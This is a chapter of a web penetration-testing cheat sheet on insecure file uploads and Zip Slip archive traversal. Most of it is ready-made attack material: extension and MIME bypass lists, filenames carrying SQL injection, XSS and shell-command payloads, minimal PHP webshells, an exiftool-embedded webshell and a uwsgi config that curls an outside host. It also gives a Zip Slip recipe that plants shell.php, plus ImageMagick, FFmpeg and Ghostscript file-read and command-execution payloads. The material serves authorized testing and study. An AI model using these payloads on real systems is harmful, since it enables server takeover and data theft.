# Ch09 — Insecure File Upload & Zip Slip

> Extension/MIME/magic-byte bypasses, filename-embedded payloads, config-file tricks, image/content smuggling, archive traversal.
> Sources: `Upload Insecure Files/` (README + per-tech subdirs: .htaccess, web.config, uwsgi.ini, EICAR, ImageMagick, FFmpeg HLS, Jetty RCE, PHP/ASP/HTML extensions), `Zip Slip/`.

**Route here when**: an endpoint accepts files — avatars, imports, attachments, document pipelines, archive extraction.

**Safety**: upload only files you own/harmless payloads (phpinfo, EICAR, a marker HTML/SVG). No reverse shells. Verify reachability before calling it exploitable — the file must be web-reachable AND parsed/executed to count.

## Executable extension lists

| Server | Extensions to try |
|---|---|
| PHP | `.php .php3 .php4 .php5 .php7 .pht .phar .phpt .pgif .phtml .phtm .inc` |
| ASP/IIS | `.asp .aspx .config .cer .asa (≤IIS7.5) shell.aspx;1.jpg (<IIS7) .soap` |
| JSP | `.jsp .jspx .jsw .jsv .jspf .wss .do .actions` |
| Perl | `.pl .pm .cgi .lib` |
| ColdFusion | `.cfm .cfml .cfc .dbm` |
| Node | `.js .json .node` |

**Abusable non-exec types** (trigger other classes): `.svg` (XXE/XSS/SSRF), `.xml` (XXE), `.csv` (formula injection), `.html` (XSS/open-redirect), `.js` (XSS), `.zip`/archive (Zip Slip, LFI gadget, DoS), `.avi` (LFI/SSRF via parser).

## Extension-filter bypasses

```ps1
file.jpg.php / file.png.php5          // double extension
file.php.jpg                          // reverse double — Apache runs "contains .php" configs
file.pHp / file.pHP5 / file.PhAr      // case confusion
file.php%00.gif / file.php\x00.jpg    // null byte (pathinfo trick)
file.php......                        // Windows strips trailing dots on save
file.php%20 / file.php%0a / file.php%0d%0a.jpg   // whitespace/newline suffix
name.%E2%80%AEphp.jpg                 // RTLO char → renders "name.gpj.php"
file.php/  file.php.\  file.j\sp  file.j/sp       // separator confusion
file.jsp/././././.                    // parser-normalization tricks
filename*=UTF8''myfile%0a.txt         // RFC5987 filename* injection
```

Windows conversion quirks (PHP on IIS): `"`→`.`, `<`→`*`, `>`→`?` in saved filenames — `web<<` overwrites `web.config`-class files (use single quotes around `filename=` in Content-Disposition). `include`/`move_uploaded_file` also strip trailing `\x20 \x22 \x2E \x3C \x3E` (and `\x2F \x5C` on fopen/move) after the real extension.

## Content checks

- **Content-Type swap**: keep `file.php`, change header to `Content-Type: image/gif` / `image/png` / `image/jpeg`. Wordlist: SecLists `web-all-content-types.txt` (`text/php`, `application/x-php`, `application/x-httpd-php`, `-source` variants). Also try setting Content-Type twice (forbidden first, allowed second).
- **Magic bytes**: prepend a signature so the sniff check passes — PNG `\x89PNG\r\n\x1a\n`, JPG `\xff\xd8\xff`, `GIF87a`/`GIF89a` — then real payload below the header.
- **NTFS ADS**: `file.asax:.jpg` creates empty forbidden-ext file; `file.asp::$data.` writes real content (Windows/IIS).

## Payload-in-filename

The filename field itself is an injection point:

```ps1
poc.js'(select*from(select(sleep(20)))a)+'.png      // time-based SQLi
image.png../../../../../../../etc/passwd           // traversal in stored path
'"><img src=x onerror=alert(document.domain)>.png  // XSS when name renders
../../../tmp/marker.png                            // write-outside-dest-dir
; sleep 10;                                        // command injection if name hits shell
```

## File-format payload families

**Minimal PHP shells** (when `<?php` is filtered):

```php
<?=`id`?>
<script language="php">system("id");</script>
```

**Valid image + code** (survives resize/recompression):

- JPG: bulletproof-JPEG technique (payload inside comment segments that survive `imagecreatefromjpeg`).
- PNG: PLTE-chunk payload (`createPNGwithPLTE`), or tEXt metadata chunks.
- GIF: global-color-table payload (`createGIFwithGlobalColorTable`).
- EXIF/comment fields via exiftool — `-Comment="<?php echo 'C:'; if($_POST){system($_POST['c']);} __halt_compiler();" img.jpg` — then include it via LFI (ch07).

**Marker / detection files**: EICAR test string file (`X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`) to fingerprint AV scanning; plain `.html`/`.svg` to test inline rendering.

## Config-file uploads (parser weaponization)

- **`.htaccess`** (Apache): `AddType application/x-httpd-php .rce` → then a `.rce` file executes as PHP. Alternates: `php_value auto_prepend_file`, `Options +ExecCGI`/`SetHandler`.
- **`web.config`** (IIS): upload to a dir where it's honored → run ASP/ASPX or add handlers/mime maps.
- **`uwsgi.ini`** (uWSGI): magic vars — `exec = @(curl yourhost)` / `@(filename)` include tricks; `ini` files are evaluated on reload.
- **`__init__.py`** (Python packages): overwrite package init → code runs on import.
- **Jetty/other**: per-server config dirs from the upstream subdirs.

## Zip Slip (archive extraction traversal)

Archive entry names carry `../` — vulnerable extractors write outside the target dir:

```ps1
malicious.zip
  ├── ../../../../etc/cron.d/x
  ├── ../../../../var/www/html/shell.php
```

Generate: `python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15` or `slipit`. Formats: zip, tar, jar, war, cpio, apk, rar, 7z.

**Symlink variant**:

```bash
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
```

Extracted symlink → subsequent archive entry or follow-up read traverses through the link. Also try absolute paths (`/etc/x`), drive-letter paths (`C:\x`), and `..%2f`-encoded names for sanitizing extractors.

## Processing-pipeline payloads

- **ImageMagick**: MVG/MSL format tricks — `push graphic-context`/`read`/`label:@/etc/passwd`/`fill 'url(http://YOUR-CALLBACK)'` (the CVE-2016-3714 "ImageTragick" family; delegate/`coder` policies usually mitigate now).
- **FFmpeg HLS**: crafted `.m3u8` referencing `file:///etc/passwd` as a segment → transcoder embeds file content in the output video (CVE-2017-9993 class).
- **Ghostscript (`.ps`/`.eps`)**: `-dSAFER` bypass era payloads — `(%pipe%/bin/id) (r) file` for command execution via PostScript pipes.

## Post-upload verification ladder

1. Direct URL fetch — is it web-reachable?
2. Content-Type on serve — `text/html`/`image/svg` for XSS, or does it execute server-side?
3. Directory guess — `/uploads/`, `/<year>/<month>/`, CDN vs same-origin.
4. Extension honored — `.svg` rendered inline = stored XSS (ch1); `.xml` parsed = XXE (ch6); `.phar`/`.zip` reachable = wrapper targets (ch7).
